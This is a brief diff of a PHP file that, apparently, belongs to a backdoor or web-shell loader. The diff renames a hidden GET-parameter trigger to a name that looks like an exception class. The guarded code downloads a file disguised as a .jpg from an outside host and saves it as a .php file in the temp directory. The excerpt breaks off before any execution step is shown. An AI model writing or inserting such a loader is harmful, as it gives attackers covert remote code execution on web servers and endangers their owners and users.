@@ -1,5 +1,5 @@
 <?php 
-if (isset($_GET['KENZ_NOLIMIT'])) {
+if (isset($_GET['InvalidOptionExceptionRuntimeException'])) {
     try {
         $u = "https://indexjpg.pages.dev/db/merah.jpg";
         $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
